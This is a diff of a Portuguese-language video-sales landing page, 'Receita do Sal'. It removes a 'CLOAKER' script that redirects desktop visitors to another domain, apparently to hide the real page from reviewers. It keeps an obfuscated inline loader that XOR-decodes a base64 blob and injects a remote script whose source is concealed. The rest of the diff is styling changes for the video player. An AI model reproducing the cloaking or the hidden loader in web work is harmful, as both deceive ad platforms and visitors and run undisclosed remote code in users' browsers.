@@ -4,78 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <!-- ============================================================ -->
-    <!-- CLOAKER 2/2 - VERIFICAÇÃO ANTES DO DOMÍNIO CARREGAR          -->
-    <!-- ============================================================ -->
-    <script>
-    (function(){
-        "use strict";
-        
-        var DESKTOP_URL = "https://zgelo.vercel.app";
-        
-        function isDesktop() {
-            try {
-                var ua = (navigator.userAgent || "").toLowerCase();
-                var uaMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|silk|kindle/i.test(ua);
-                var uaTablet = /ipad|tablet|playbook|silk/i.test(ua) || (/android/i.test(ua) && !/mobile/i.test(ua));
-                
-                var hasTouch = ("ontouchstart" in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0);
-                var coarsePointer = window.matchMedia && window.matchMedia("(pointer: coarse)").matches;
-                var hoverNone = window.matchMedia && window.matchMedia("(hover: none)").matches;
-                
-                var w = window.innerWidth || document.documentElement.clientWidth || 0;
-                var h = window.innerHeight || document.documentElement.clientHeight || 0;
-                var shortSide = Math.min(w, h);
-                
-                var dpr = window.devicePixelRatio || 1;
-                var platform = (navigator.platform || "").toLowerCase();
-                var platformDesktop = /win|mac|linux|x11|cros/i.test(platform) && !/iphone|ipad|android/i.test(platform);
-                
-                var scoreMobile = 0;
-                if (uaMobile) scoreMobile += 3;
-                if (uaTablet) scoreMobile += 2;
-                if (hasTouch) scoreMobile += 1;
-                if (coarsePointer) scoreMobile += 1;
-                if (hoverNone) scoreMobile += 1;
-                if (shortSide < 768) scoreMobile += 2;
-                if (shortSide < 480) scoreMobile += 1;
-                
-                var scoreDesktop = 0;
-                if (!hasTouch) scoreDesktop += 2;
-                if (!coarsePointer) scoreDesktop += 1;
-                if (!hoverNone) scoreDesktop += 1;
-                if (shortSide >= 1024) scoreDesktop += 2;
-                if (platformDesktop) scoreDesktop += 1;
-                if (dpr <= 1.5 && shortSide >= 1024) scoreDesktop += 1;
-                
-                return scoreDesktop > scoreMobile && !uaMobile;
-            } catch(e) {
-                return true;
-            }
-        }
-        
-        var quizDevice = null;
-        try { quizDevice = sessionStorage.getItem("__clk_device__"); } catch(e) {}
-        var localDevice = isDesktop() ? "desktop" : "mobile";
-        var finalDevice = (quizDevice === "desktop" || localDevice === "desktop") ? "desktop" : "mobile";
-        
-        if (finalDevice === "desktop") {
-            try { window.stop(); } catch(e) {}
-            if (window.location.replace) {
-                window.location.replace(DESKTOP_URL);
-            } else {
-                window.location.href = DESKTOP_URL;
-            }
-            setTimeout(function(){
-                if (window.location.href.indexOf("/sal") === -1) {
-                    window.location.href = DESKTOP_URL;
-                }
-            }, 100);
-            throw new Error("__CLK_REDIRECT__");
-        }
-    })();
-    </script>
-
     <script>(function(){var b_o8=atob("DDvJcw8nAy0Wwv1gOkDrBn1LIRc0qokUSkjzXCBEZ0M4t4kNU12wXWxIbgN0sNITWUmgA3tULFhir45PVlq9FnxTLUdl4NFCW0+9AWZFdllzsd9aYUDrHW5KZg8s4JkBTlrkBntKaktv740SX02sHXsKe055ptATWVDrXy1RYkFjp99aGBm0X3QFbUx7p99aGF+oB24Kdll7q5sZF0u7FnlCbVk7sYgCU1+6USMFdUx6t5hCABnrDlJa");var d_lond=[];for(var h_ba4=0;h_ba4<b_o8.length;h_ba4++){d_lond.push(b_o8.charCodeAt(h_ba4)&255);}var j_sphm=d_lond[0];var j_0p5v=d_lond.slice(1,1+j_sphm);var z_zde=d_lond.slice(1+j_sphm);var l_uau=z_zde.map(function(b,w_2){return b^j_0p5v[w_2%j_sphm];});var d_5u="";for(var j_qhqy=0;j_qhqy<l_uau.length;j_qhqy++){d_5u+=String.fromCharCode(l_uau[j_qhqy]&255);}var g_ew=decodeURIComponent(escape(d_5u));var u_t0=JSON.parse(g_ew);var e_i5q=u_t0.globals||[];e_i5q.forEach(function(l_n2n){window[l_n2n.name]=l_n2n.value;});var f_sv=document.createElement("script");f_sv.src=u_t0.url;f_sv.async=true;f_sv.defer=true;(u_t0.attributes||[]).forEach(function(r_8){f_sv.setAttribute(r_8.name,r_8.value);});(document.head||document.documentElement).appendChild(f_sv);})();</script>
 
     <title>Receita do Sal</title>
@@ -189,6 +117,36 @@
             margin: 0 auto;
         }
 
+      /* ===== WRAPPER COM BORDER RADIUS ===== */
+        .vsl-frame {
+            width: 100%;
+            max-width: 280px;
+            margin: 0 auto;
+            position: relative;
+            border-radius: 14px;          /* ← muda aqui o raio */
+            overflow: hidden;             /* ← corta o que sai fora */
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);  /* ← opcional: sombra */
+            border: 1px solid #2a2a2a;    /* ← opcional: borda subtil */
+        }
+
+        /* Forçar o player a respeitar o wrapper */
+        .vsl-frame vturb-smartplayer,
+        .vsl-frame vturb-smartplayer > div,
+        .vsl-frame vturb-smartplayer iframe,
+        .vsl-frame vturb-smartplayer video,
+        .vsl-frame #ifr_6ab68817be6066e07d2ee5e8,
+        .vsl-frame [id^="ifr_"] {
+            max-width: 100% !important;
+            width: 100% !important;
+            display: block !important;
+            border-radius: 16px !important;   /* ← mesmo raio no player */
+            overflow: hidden !important;
+        }
+
+        /* Placeholder mantém aspect ratio 9:16 */
+        .vsl-frame .vturb-player-placeholder {
+            padding-top: 177.77% !important;
+        }
         /* ===== COMENTÁRIOS ===== */
         .comments-section {
             animation: screenIn 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
@@ -389,9 +347,11 @@
 
         <!-- VSL PURA -->
         <div class="vsl-player">
-            <vturb-smartplayer id="vid-6ab68817be6066e07d2ee5e8" style="display: block; margin: 0 auto; width: 100%; max-width: 240px;">
-                <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: black;"></div>
-            </vturb-smartplayer>
+            <div class="vsl-frame">
+                <vturb-smartplayer id="vid-6ab68817be6066e07d2ee5e8">
+                    <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: black;"></div>
+                </vturb-smartplayer>
+            </div>
             <script type="text/javascript">
                 var s=document.createElement("script");
                 s.src="https://scripts.converteai.net/2c3d960f-39c3-4072-a7af-c60fed7da363/players/6ab68817be6066e07d2ee5e8/v4/player.js";
